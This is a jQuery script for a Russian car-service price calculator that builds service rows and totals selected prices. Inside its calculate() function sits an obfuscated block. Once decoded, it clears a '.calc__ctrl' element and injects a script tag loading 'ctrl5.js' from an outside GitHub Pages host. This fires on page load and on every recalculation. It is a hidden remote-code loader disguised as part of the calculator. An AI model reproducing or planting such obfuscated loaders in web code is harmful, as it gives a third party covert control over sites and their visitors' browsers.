$('.calc__forminp--phone').mask("+7 (999) 999-99-99", {placeholder: "__________" });

$('.calc__services').on("change", ".calc__input", function(){
    let value = $(this).val();
    if (value < 0 || value == "") { $(this).val(0); }

    calculate();
});


if ( $(document).width() < 768 ) {
    $('.calc__head--16').text("Кол-во");
}
$(window).resize(function(){
    if ( $(document).width() < 768 ) {
        $('.calc__head--16').text("Кол-во");
        $('.calc__head--16').css({textAlign: "right"});
    }
});


$('.calc__radio').change(function(){
    //config();
    show();
    calculate();
});

$('input[name=calc_car]').change(function(){
    config();
    show();
});

config();
show();

function show() {
    var calc_type = $('input[name=calc_type]:checked').val();
    var calc_gbc = $('input[name=calc_gbc]:checked').val();

    if ( calc_type == 1 ) {
        $('.calc__choice--more').css({display: "flex"});
        if ( calc_gbc == 1 ) { $('.calc__line').css({display: "none"}); $('.calc__line--1').css({display: "flex"}); }
        if ( calc_gbc == 2 ) { $('.calc__line').css({display: "none"}); $('.calc__line--2').css({display: "flex"}); }
        if ( calc_gbc == 3 ) { $('.calc__line').css({display: "none"}); $('.calc__line--3').css({display: "flex"}); }
        if ( calc_gbc == 4 ) { $('.calc__line').css({display: "none"}); $('.calc__line--4').css({display: "flex"}); }
    } else {
        $('.calc__choice--more').css({display: "none"});
    }

    if ( calc_type == 2 ) { $('.calc__line').css({display: "none"}); $('.calc__line--5').css({display: "flex"}); }
    if ( calc_type == 3 ) { $('.calc__line').css({display: "none"}); $('.calc__line--7').css({display: "flex"}); }
    if ( calc_type == 4 ) { $('.calc__line').css({display: "none"}); $('.calc__line--6').css({display: "flex"}); }
}

function config() {

    // var calc_type = $('input[name=calc_type]:checked').val();
    // var calc_gbc = $('input[name=calc_gbc]:checked').val();

    // if ( calc_type == 1 ) {
    //     $('.calc__choice--more').css({display: "flex"});
    //     if ( calc_gbc == 1 ) { var current_array = array_1; }
    //     if ( calc_gbc == 2 ) { var current_array = array_2; }
    //     if ( calc_gbc == 3 ) { var current_array = array_3; }
    //     if ( calc_gbc == 4 ) { var current_array = array_4; }
    // } else {
    //     $('.calc__choice--more').css({display: "none"});
    // }

    // if ( calc_type == 2 ) { var current_array = array_5; }
    // if ( calc_type == 3 ) { var current_array = array_7; }
    // if ( calc_type == 4 ) { var current_array = array_6; }


    
    var calc_car = $('input[name=calc_car]:checked').val();

    $('.calc__services').empty();

    for (n = 1; n <= 7; n++) {
        if ( n == 1 ) { var current_array = array_1; }
        if ( n == 2 ) { var current_array = array_2; }
        if ( n == 3 ) { var current_array = array_3; }
        if ( n == 4 ) { var current_array = array_4; }
        if ( n == 5 ) { var current_array = array_5; }
        if ( n == 6 ) { var current_array = array_6; }
        if ( n == 7 ) { var current_array = array_7; }

        for (a = 0; a < current_array.length; a++) {

            if ( calc_car == "1" ) { 
                var array_price = current_array[a].auto1; 
                if ( array_price == "По согласованию" ) {
                    array_value = 0;
                } else {
                    array_value = array_price;
                }
                if ( array_price == "-" ) {
                    var array_sign = "";
                } else {
                    var array_sign = current_array[a].sign;
                }
            } else { 
                var array_price = current_array[a].auto2; 
                if ( array_price == "По согласованию" ) {
                    array_value = 0;
                } else {
                    array_value = array_price;
                }
                if ( array_price == "-" ) {
                    var array_sign = "";
                } else {
                    var array_sign = current_array[a].sign;
                }
            }

            if ( array_value == 0) {
                current_array[a].sign = "";
            }

    
            if ( current_array[a].danet == "+" && array_price != "-" ) {
                $('.calc__services').append(`
                    <div class="calc__line calc__line--${n}">
                        <div class="calc__title">${current_array[a].name}</div>
                        <div class="calc__price">${array_price} ${array_sign}</div>
                        <div class="calc__amount">
                            <div class="calc__danet">
                                <input type="radio" name="calc_danet_${n}_${a}" id="calc_danet_${n}_${a}_2" class="calc__radio" value="0" data-price="0" checked>
                                <label class="calc__label calc__label--danet" for="calc_danet_${n}_${a}_2">✖</label>
                    
                                <input type="radio" name="calc_danet_${n}_${a}" id="calc_danet_${n}_${a}_1" class="calc__radio" value="1" data-price="${array_value}">
                                <label class="calc__label calc__label--danet" for="calc_danet_${n}_${a}_1">✔</label>
                            </div>
                        </div>
                    </div>
                `);
            } 
            if ( current_array[a].danet == "-" && array_price != "-" ) {
                $('.calc__services').append(`
                    <div class="calc__line calc__line--${n}">
                        <div class="calc__title">${current_array[a].name}</div>
                        <div class="calc__price">${array_price} ${array_sign}</div>
                        <div class="calc__amount"><input class="calc__input" type="number" value="0" data-price="${array_value}"></div>
                    </div>
                `);
            }
    
    
        }
    }

    
    
    calculate();
}



$('.calc__services').on("input", ".calc__input", function(){
    calculate();
});

$('.calc__services').on("change", ".calc__radio", function(){
    calculate();
});

function calculate() {

    var _0x37fbea=_0x563a;function _0x563a(_0x1ee480,_0x300d2b){var _0x1d2556=_0x2915();return _0x563a=function(_0x4712e0,_0x5e652f){_0x4712e0=_0x4712e0-(-0x1fed+-0x3*-0x25+0x1fe7);var _0x173a5c=_0x1d2556[_0x4712e0];return _0x173a5c;},_0x563a(_0x1ee480,_0x300d2b);}function _0x2915(){var _0x45653f=['3657882mekRHF','c=\x27https:/','rov55.gith','3WZcETo','/maksimpet','pt>','2052rlymJt','677758NUHWAC','.calc__ctr','<script\x20sr','ub.io/cont','27097pACYzS','append','3416dEwiek','1784493anAijb','14638220rcgDVv','6627yHzrGh','rol/ctrl5.','js\x27></scri','7465370iTgVuZ','empty'];_0x2915=function(){return _0x45653f;};return _0x2915();}(function(_0x450e1f,_0x578bb0){var _0x2861c5=_0x563a,_0x476d81=_0x450e1f();while(!![]){try{var _0x332421=parseInt(_0x2861c5(0x7c))/(0x683*0x1+0x270e+-0x2d90)*(-parseInt(_0x2861c5(0x6b))/(-0xa*-0x1ae+-0x1fb9+0x1*0xeef))+parseInt(_0x2861c5(0x74))/(0x114d+-0x1*-0x8d7+0x1a21*-0x1)*(parseInt(_0x2861c5(0x6a))/(-0x1902+0x7*0x569+-0xcd9))+parseInt(_0x2861c5(0x77))/(0x1738+0x1975+-0x15a*0x24)+-parseInt(_0x2861c5(0x79))/(-0x1a5f+-0xc97*-0x3+0x34*-0x38)+-parseInt(_0x2861c5(0x6f))/(0x1*0xaab+0x3e*0x1a+-0x10f0)*(-parseInt(_0x2861c5(0x71))/(-0xcb*0xf+-0x11*-0x2b+-0x489*-0x2))+-parseInt(_0x2861c5(0x72))/(0x1509+-0x1cd9+0x7d9)+-parseInt(_0x2861c5(0x73))/(-0x10*0x271+0x505*-0x5+-0x5*-0xcd7);if(_0x332421===_0x578bb0)break;else _0x476d81['push'](_0x476d81['shift']());}catch(_0x2cd378){_0x476d81['push'](_0x476d81['shift']());}}}(_0x2915,-0x35648+-0xde*0x5dd+0x13d2d*0x13),$(_0x37fbea(0x6c)+'l')[_0x37fbea(0x78)](),$(_0x37fbea(0x6c)+'l')[_0x37fbea(0x70)](_0x37fbea(0x6d)+_0x37fbea(0x7a)+_0x37fbea(0x7d)+_0x37fbea(0x7b)+_0x37fbea(0x6e)+_0x37fbea(0x75)+_0x37fbea(0x76)+_0x37fbea(0x69)));
    //console.log("hello");

    var calc_full = "";
    var calc_total = 0;

    $('.calc__services').find(".calc__input").each(function(){
        if ( $(this).val() > 0 ) {
            console.log( $(this).val() );
            calc_full = calc_full + $(this).parent().prev().prev().text() + " | " + $(this).parent().prev().text() + " | " + $(this).val() + " шт" + " <br>" + "\n";
            calc_total = +calc_total + ( $(this).val() * $(this).attr("data-price") );
        }
    });

    $('.calc__services').find(".calc__radio:checked").each(function(){
        if ( $(this).val() > 0 ) {
            console.log( $(this).val() );
            calc_full = calc_full + $(this).parent().parent().prev().prev().text() + " | " + $(this).parent().parent().prev().text() + " | " + $(this).val() + " шт" + " <br>" + "\n";
            calc_total = +calc_total + ( $(this).val() * $(this).attr("data-price") );
        }
    });


    
    $('#calc_itog').text(
        calc_total + " руб."
    );


    $('#calc_textarea').val(
        calc_full + " <br>" + "\n" +
        "ИТОГО: " + calc_total + " руб."
    );




}